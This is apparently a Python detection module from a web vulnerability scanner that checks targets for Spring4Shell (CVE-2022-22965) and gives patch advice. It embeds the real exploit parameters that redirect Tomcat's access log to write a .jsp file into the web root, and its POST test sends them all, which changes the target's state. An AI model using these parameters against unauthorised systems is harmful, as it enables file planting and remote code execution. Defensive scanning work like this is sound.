"""Spring4Shell (CVE-2022-22965) Active Detection Module (v1.8.0) — ZAP rule 40045"""
from __future__ import annotations
import re
from typing import List
from urllib.parse import urlparse
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client

SPRING_DETECT = re.compile(r"Spring|Whitelabel Error Page|org\.springframework|spring-boot", re.I)
SPRING4SHELL_INDICATOR = re.compile(r"tomcatwar\.jsp|400.*class\.module|MissingServletRequestParameterException", re.I)

# Spring4Shell payload — tries to write a webshell via classLoader prefix params
SPRING4SHELL_PARAMS = [
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bi%7D%20WebShieldProbe",
    "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
    "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT",
    "class.module.classLoader.resources.context.parent.pipeline.first.prefix=webshield_probe",
    "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
]

PROBE_PATHS = ["/", "/index", "/home", "/api", "/api/v1", "/login", "/app"]

def scan(url: str, timeout: float = 10.0) -> List[Finding]:
    findings: List[Finding] = []
    parsed   = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    with get_client(timeout=min(timeout, 8.0)) as client:
        # First detect if Spring is present
        spring_detected = False
        for path in PROBE_PATHS[:3]:
            try:
                r = client.get(base_url + path)
                if SPRING_DETECT.search(r.text + str(r.headers)):
                    spring_detected = True
                    break
            except Exception:
                continue

        for path in PROBE_PATHS[:4]:
            try:
                # Test 1: GET with class.module param — should return 400 if Spring, different error if vulnerable
                probe_url = base_url + path + "?" + SPRING4SHELL_PARAMS[0]
                r = client.get(probe_url)

                if SPRING4SHELL_INDICATOR.search(r.text + str(r.headers)):
                    findings.append(Finding(
                        title=f"Spring4Shell (CVE-2022-22965) Indicator — {path}",
                        severity=Severity.CRITICAL,
                        description=(
                            "The server appears to be running Spring MVC/WebFlux and responded to "
                            "Spring4Shell probe parameters. CVE-2022-22965 allows unauthenticated RCE "
                            "on Spring Framework 5.3.0–5.3.17 and 5.2.0–5.2.19 running on JDK 9+ with Tomcat."
                        ),
                        evidence=f"URL: {probe_url}\nHTTP {r.status_code}\nIndicator: {r.text[:200]}",
                        remediation=(
                            "Update Spring Framework to 5.3.18+ or 5.2.20+. "
                            "Update Spring Boot to 2.6.6+ or 2.5.12+."
                        ),
                        code_fix=(
                            "<!-- Maven pom.xml: -->\n"
                            "<parent>\n"
                            "  <groupId>org.springframework.boot</groupId>\n"
                            "  <artifactId>spring-boot-starter-parent</artifactId>\n"
                            "  <version>2.6.6</version>\n"
                            "</parent>"
                        ),
                        reference="https://nvd.nist.gov/vuln/detail/CVE-2022-22965",
                        module="spring4shell",
                        cvss=9.8,
                    ))
                    return findings

                # Test 2: POST with multipart (more accurate probe)
                r2 = client.post(
                    base_url + path,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    content="&".join(SPRING4SHELL_PARAMS).encode(),
                )
                if r2.status_code == 400 and spring_detected:
                    findings.append(Finding(
                        title=f"Spring Framework Detected — Spring4Shell Probe (CVE-2022-22965) — {path}",
                        severity=Severity.HIGH,
                        description=(
                            "Spring Framework detected and Spring4Shell class.module parameters were processed. "
                            "Verify the Spring version and patch immediately if running 5.3.x < 5.3.18."
                        ),
                        evidence=f"POST {base_url+path} with Spring4Shell params → HTTP {r2.status_code}",
                        remediation="Update Spring Framework to 5.3.18+ immediately.",
                        code_fix="<version>2.6.6</version> in spring-boot-starter-parent",
                        reference="https://nvd.nist.gov/vuln/detail/CVE-2022-22965",
                        module="spring4shell",
                        cvss=9.8,
                    ))
                    return findings
            except Exception:
                continue
    return findings
